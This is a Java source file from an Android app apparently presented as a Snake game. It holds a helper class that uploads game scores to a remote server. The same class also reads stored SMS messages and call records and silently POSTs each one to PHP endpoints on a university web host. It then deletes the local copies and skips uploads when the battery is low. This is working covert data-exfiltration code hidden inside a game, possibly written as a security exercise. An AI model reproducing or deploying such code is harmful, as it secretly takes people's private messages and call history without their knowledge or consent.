package com.example.s1300465.snake;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.AsyncTask;
import android.os.BatteryManager;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.SocketTimeoutException;
import java.net.URI;
import java.net.URL;
import java.net.URLEncoder;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Iterator;

public class RemoteDatabaseHelper {
    Context context;

    public RemoteDatabaseHelper(Context context){
        this.context = context;
    }

    public void checkConnectionAndUpload(){
        Log.d("RDH", "Attempting to upload...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                //First check the battery level
                //If it's too low, don't try to upload (just in case)
                IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent batteryStatus = context.registerReceiver(null, ifilter);
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

                float batteryPct = (level / (float)scale)*100;
                Log.d("Battery", batteryPct + "%");

                if(batteryPct < 10){
                    return;
                }

                //If the battery is good, now try connecting to Mayar
                try {
                    URL url = new URL("http://mayar.abertay.ac.uk/~1300465/snake/call.php");
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setConnectTimeout(5000);
                    connection.connect();

                    //If we're connected, send the data to the remote database
                    if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
                        uploadData();
                        Log.d("Conn", "Connected to remote DB");
                    }else{
                        Log.d("Conn", "Connection to remote DB failed");
                    }

                    connection.disconnect();
                }catch(IOException ex){
                    Log.w("Connection", "Remote DB connection timed out");
                }
            }
        }).start();
    }

    public void uploadData(){
        //Go through each SMS and upload tt
        ArrayList<JSONObject> texts = new DatabaseHelper(context).getSMS();
        Iterator<JSONObject> textIterator = texts.iterator();
        while(textIterator.hasNext()){
            new PostRequester(context).execute(textIterator.next());
        }

        ArrayList<JSONObject> calls = new DatabaseHelper(context).getCalls();
        Iterator<JSONObject> callsIterator = calls.iterator();
        while(callsIterator.hasNext()){
            new PostRequester(context).execute(callsIterator.next());
        }

        ArrayList<JSONObject> scores = new DatabaseHelper(context).getJSONScores();
        Iterator<JSONObject> scoresIterator = scores.iterator();
        while(scoresIterator.hasNext()){
            new PostRequester(context).execute(scoresIterator.next());
        }
    }


}

class PostRequester extends AsyncTask<JSONObject, String, String> {
    Context context;
    int status;
    String type; //sms or call
    long rowID; //The DB row of the SMS we're dealing with
    public PostRequester(Context context){
        this.context = context;
    }

    protected String doInBackground(JSONObject[] params){
        String result = null;
        String query;
        JSONObject json;
        HttpURLConnection urlConnection = null;
        InputStream in;

        try {
            json = params[0];
            type = json.getString("type");
            rowID = json.getLong("rowid");
            JSONObject content = json.getJSONObject(type);
            query = jsonToQuery(content);
        }catch(JSONException ex){
            //If something went wrong with the data, just abandon it
            ex.printStackTrace();
            return null;
        }

        String urlString = "http://mayar.abertay.ac.uk/~1300465/snake/" + type + ".php";


        try {
            URL url = new URL(urlString);
            urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setDoOutput(true);
            urlConnection.setDoInput(true);
            urlConnection.setRequestMethod("POST");

            OutputStreamWriter writer = new OutputStreamWriter(urlConnection.getOutputStream());

            Log.d("Query", query);
            writer.write(query);

            writer.flush();
            writer.close();

            urlConnection.connect();
            status = urlConnection.getResponseCode();
            if(status >= HttpURLConnection.HTTP_BAD_REQUEST){
                in = new BufferedInputStream(urlConnection.getErrorStream());
            }else{
                in = new BufferedInputStream(urlConnection.getInputStream());
            }

            BufferedReader streamReader = new BufferedReader(new InputStreamReader(in, "UTF-8"));
            StringBuilder responseStrBuilder = new StringBuilder();

            String inputStr;
            while ((inputStr = streamReader.readLine()) != null) {
                responseStrBuilder.append(inputStr);
            }
            result = responseStrBuilder.toString();
            in.close();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            urlConnection.disconnect();
        }

        return result;
    }

    public String jsonToQuery(JSONObject json) throws JSONException {
        //Convert a JSON object of parameters to a URL parameter string
        StringBuilder sb = new StringBuilder();
        Iterator<String> keys = json.keys();

        while (keys.hasNext()) {
            String key = keys.next();
            sb.append(key);
            sb.append("=");
            String item = json.get(key).toString();
            try {
                item = URLEncoder.encode(item, "UTF-8");
            }catch(UnsupportedEncodingException ex){
                ex.printStackTrace();
            }
            sb.append(item);
            if(keys.hasNext()) {
                sb.append("&");
            }
        }

        return sb.toString();
    }

    protected void onPostExecute(String result){
        Log.d("Result", result);
        if(result.equalsIgnoreCase("Success")){
            //If the query was successful, we can remove the row from the local database
            if(type.equalsIgnoreCase("SMS")){
                new DatabaseHelper(context).removeSMS(rowID);
            }else if(type.equalsIgnoreCase("Call")){
                new DatabaseHelper(context).removeCall(rowID);
            }else if(type.equalsIgnoreCase("Score")){
                new DatabaseHelper(context).markScoreUploaded(rowID);
            }
        }

        if(status >= HttpURLConnection.HTTP_BAD_REQUEST){
            Log.d("Bad Request", status + "");
        }

    }
}

class ScoreFetcher {
    APIResponse obj;
    final String URL = "http://mayar.abertay.ac.uk/~1300465/snake";

    public ScoreFetcher(APIResponse obj){
        this.obj = obj;
    }

    public void fetchScores(){
        new JSONFetcher(obj).execute(URL + "/get_scores.php");
    }
}

class JSONFetcher extends AsyncTask<String, String, JSONObject> {
    APIResponse obj;
    int status;

    public JSONFetcher(APIResponse obj){
        this.obj = obj;
    }

    protected JSONObject doInBackground(String[] params){
        JSONObject result = null;
        InputStream in;
        String urlString = params[0];

        try {
            URL url = new URL(urlString);
            URI uri = new URI(url.getProtocol(), url.getUserInfo(), url.getHost(), url.getPort(), url.getPath(), url.getQuery(), url.getRef());
            url = new URL(uri.toASCIIString());

            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setConnectTimeout(5000);

            urlConnection.connect();

            status = urlConnection.getResponseCode();
            if(status >= HttpURLConnection.HTTP_BAD_REQUEST){
                in = new BufferedInputStream(urlConnection.getErrorStream());
            }else{
                in = new BufferedInputStream(urlConnection.getInputStream());
            }

            BufferedReader streamReader = new BufferedReader(new InputStreamReader(in, "UTF-8"));
            StringBuilder responseStrBuilder = new StringBuilder();

            String inputStr;
            while ((inputStr = streamReader.readLine()) != null) {
                responseStrBuilder.append(inputStr);
            }
            result = new JSONObject(responseStrBuilder.toString());
            in.close();
        }catch(FileNotFoundException ex){
            Log.w("API", "File not found! " + urlString);
        }catch(UnknownHostException ex) {
            Log.w("API", "Couldn't find server - no internet connection?");
            this.cancel(true);
        }catch(SocketTimeoutException ex){
            Log.w("API", "Connection timed out (no Mayar connection)");
            status = HttpURLConnection.HTTP_CLIENT_TIMEOUT;
        }catch(Exception e){
            e.printStackTrace();
        }

        return result;
    }

    protected void onPostExecute(JSONObject result){
        if(status >= HttpURLConnection.HTTP_BAD_REQUEST){
            try {
                if(status == HttpURLConnection.HTTP_CLIENT_TIMEOUT){
                    this.obj.resultsReturned(null);
                    return;
                }

                Log.w("Bad Request", status + " " + result.getString("message"));
            }catch(NullPointerException | JSONException ex){
                ex.printStackTrace();
            }
        }

        this.obj.resultsReturned(result);
    }
}


interface APIResponse {
    void resultsReturned(JSONObject results);
}
